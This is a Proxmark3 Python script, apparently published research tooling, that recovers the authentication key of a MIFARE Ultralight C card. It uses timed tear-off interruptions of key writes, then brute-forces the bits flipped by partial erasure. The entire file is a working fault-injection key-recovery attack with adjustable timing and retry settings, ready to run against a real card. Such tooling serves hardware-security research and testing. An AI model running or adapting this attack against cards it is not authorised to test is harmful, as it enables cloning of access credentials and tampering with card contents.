#!/usr/bin/env -S uv run --with pycryptodome pm3 -y

"""Recover the key used in Ultralight C authentication."""

import sys
import argparse
import time
import pm3
from itertools import combinations

total_auth = 0


def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def enumerate_words_with_k_bits_set(n_bits, max_bits_set, mask=0):
    """Generate all n-bit words with up to max_bits_set bits set, respecting a mask."""
    non_masked_positions = [pos for pos in range(n_bits) if not (mask & (1 << pos))]
    yield 0
    for k in range(1, max_bits_set + 1):
        # print(f"Enumerating words with {k} bits set: {len(list(combinations(non_masked_positions, k)))}")
        for bits in combinations(non_masked_positions, k):
            value = 0
            for pos in bits:
                value |= (1 << pos)
            yield value


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def construct_key(key_segment, segment):
    """Construct the full key from the segment and its value."""
    assert segment < 4
    if segment == 0:
        key = f'{key_segment:08x}000000000000000000000000'
    elif segment == 1:
        key = f'00000000{key_segment:08x}0000000000000000'
    elif segment == 2:
        key = f'0000000000000000{key_segment:08x}00000000'
    elif segment == 3:
        key = f'000000000000000000000000{key_segment:08x}'
    return key


def read_block(p, block):
    """Read a block and return the formatted block data as int."""
    # Much quicker than hf mfu rdbl --force
    console_debug(p, f'hf 14a raw -sc 30{block:02x}', debug=debug)
    for line in p.grabbed_output.split('\n'):
        parts = line.split(']')
        if len(parts) == 3:
            data_bytes = parts[1].strip().split()[:4]  # Extract the first 4 bytes
            data_int = int(''.join(data_bytes), 16)
            return data_int
    return None


def auth(p, key_segment, block, retries=0):
    """Authenticate with the given key and block."""
    global total_auth
    assert segment < 4
    if block < 44:
        block_segment = int.from_bytes(key_segment.to_bytes(4, 'big')[::-1], 'big')
        block_read = read_block(p, block)
        if debug:
            print(f"Auth block {block}: {block_read:08x} <> {block_segment:08X}")
        total_auth += 1
        if block_read != block_segment:
            total_auth += retries
        return block_read == block_segment
    else:
        block2segment = {44: 1, 45: 0, 46: 3, 47: 2}
        key = construct_key(key_segment, block2segment[block])
        console_debug(p, f'hf mfu cauth --key {key} --retries {retries} --nocheck', debug=debug)
        success = False
        for line in p.grabbed_output.split('\n'):
            if "Authentication" in line:
                if "ok" in line:
                    success = True
                if "attempts:" in line:
                    start = line.find(":") + 1
                    attempts = int(line[start:].strip())
                    total_auth += attempts
    return success


def bruteforce_key(p, key_segment, block, retries=5, bitflips=2, bitflips_list=None):
    """Bruteforce the key by flipping bits and checking authentication."""
    global total_auth
    print(f"Bruteforcing, total attempts: {total_auth}")
    if block < 44:
        block_segment = int.from_bytes(key_segment.to_bytes(4, 'big')[::-1], 'big')
        block_read = read_block(p, block)
        if debug:
            print(f"Auth block {block}: {block_read:08x} <> {block_segment:08X}")
        flips = block_read ^ block_segment
        hw = hamming_weight(flips)
        print(f"RFU Hamming Weight: {hw}, {'too large' if hw > bitflips else 'OK'}")
        if flips in bitflips_list:
            total_auth += bitflips_list.index(flips) + 1
            return int.from_bytes(flips.to_bytes(4, 'big')[::-1], 'big')
        else:
            total_auth += (retries + 1) * len(bitflips_list)
            return None
    else:
        block2segment = {44: 1, 45: 0, 46: 3, 47: 2}
        segment = block2segment[block]
        key = construct_key(key_segment, segment)
        console_debug(p,
                      f'hf mfu cchk '
                      f'-f mfulc_segment_hw{bitflips}.dic '
                      f'--segment {segment} '
                      f'--key {key} '
                      f'--retries {retries} '
                      f'--xor '
                      f'--nocheck', debug=debug)
        key = None
        for line in p.grabbed_output.split('\n'):
            if "Error" in line:
                raise RuntimeError(f"Error during bruteforce: {line}")
            if "Authentication attempts:" in line:
                start = line.find(":") + 1
                attempts = int(line[start:].strip())
                total_auth += attempts
            if "found valid key" in line:
                line = line[line.index("key") + 1:]
                start = line.find("[") + 1
                end = line.find("]")
                test_key = int(line[start:end].replace(" ", ""), 16)
                print(f"Auth succeeded with key: {test_key:032X}")
                sys.stdout.flush()
                key = (test_key >> (32 * (3 - segment))) & 0xFFFFFFFF
        return key


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


if __name__ == "__main__":
    p = pm3.pm3()

    parser = argparse.ArgumentParser(description="Recover the key used in Ultralight C authentication")
    parser.add_argument('--eeprom-init', type=lambda x: int(x, 0), default=None,
                        help='Initial key block EEPROM value (hex). def: None')
    parser.add_argument('--final', type=lambda x: int(x, 0), default=0x00000000,
                        help='Final key block value (hex)')
    parser.add_argument('--block', type=lambda x: int(x, 0), required=True,
                        help='Block number (hex or int) Key:44-47 UserData:4-39')
    parser.add_argument('--tear1', type=int, default=380,
                        help='First tearoff value (ms)')
    parser.add_argument('--tear2', type=int, default=240,
                        help='Second tearoff value (ms)')
    parser.add_argument('--bitflips', type=int, default=2,
                        help='Maximum bitflips')
    parser.add_argument('--retries', type=int, default=0,
                        help='Number of retries')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug output')
    args = parser.parse_args()

    eeprom_init = args.eeprom_init
    final = args.final
    block = args.block
    tear1 = args.tear1
    tear2 = args.tear2
    bitflips = args.bitflips
    retries = args.retries
    debug = args.debug
    segment = 3 - ((block - 48) % 4)
    assert (block >= 44 and block <= 47) or (block >= 4 and block <= 39), "Block value invalid"
    # simulation on RFU blocks, we can read directly the block state
    rfu = block & 0xFC != 44
    bitflips_list = None
    if rfu:
        bitflips_list = list(enumerate_words_with_k_bits_set(32, bitflips, 0x01010101))

    if eeprom_init is not None:
        initkey = int.from_bytes(eeprom_init.to_bytes(4, 'big')[::-1], 'big')
        init = eeprom_init
    print(f"Block      {block:2d} (0x{block:02X})\n"
          f"Segment    {segment:2d}")
    ntear2 = 0
    max_hd = 0
    keys = []
    start_time = time.time()

    # Erase the other key segments
    console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
    block_start = block & 0xFC
    for i in range(block_start, block_start + 4):
        if i == block:
            continue
        console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)

    if eeprom_init is not None:
        # Set key segment for test
        console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{init:08x}', capture=False, debug=debug)

    print(f"Testing with initial tearoff value: {tear1} ms")
    console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
    console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
    console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
    assert auth(p, 0, block) == 0, "Tear1 too long, key segment already erased"
    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

    tear2_orig = tear2
    while True:
        if tear2_orig != tear2:
            print(f"Tears: "f"1*{tear1}ms + {ntear2}*[{tear2_orig}..{tear2}]ms")
        else:
            print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms")
        sys.stdout.flush()
        assert auth(p, 0, block) == 0, "Tear2 too long, key segment already erased"
        newkey = bruteforce_key(p, 0, block, retries, bitflips=bitflips, bitflips_list=bitflips_list)
        if newkey is not None:
            print(f"   New key bits found:   {newkey:08X} with HW={hamming_weight(newkey):02d}")
            if eeprom_init is not None:
                print(f"     EEPROM bits init:   {eeprom_init:08X} ({eeprom_init:032b})")
            newblock = int.from_bytes(newkey.to_bytes(4, 'big')[::-1], 'big')
            bits = ''.join(
                '1' if (newblock & (1 << i)) else '.' for i in range(31, -1, -1)
            )
            print(f" Recovered block bits:             {bits}")
            print(f"Total authentications:   {total_auth}")
            current_time = time.time()
            elapsed_time = current_time - start_time
            minutes, seconds = divmod(elapsed_time, 60)
            print(f"Time spent since start:  {int(minutes)} minutes {seconds:.2f} seconds")
            sys.stdout.flush()
            console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
            if eeprom_init is not None:
                # Erase the key
                for i in range(block_start, block_start + 4):
                    console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
            if eeprom_init is not None:
                assert (newblock) & ~eeprom_init == 0, "Invalid key: EEPROM bits set were not set in EEPROM init?!"
            break

        if ntear2 > 0 and ntear2 % 10 == 0:
            tear2 = int(tear2 * 1.05)
            print(f"Extending tearoff value: {tear2} ms")
            console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)
        print(f"Testing with extra tearoff value: {tear2} ms")
        sys.stdout.flush()
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        ntear2 += 1
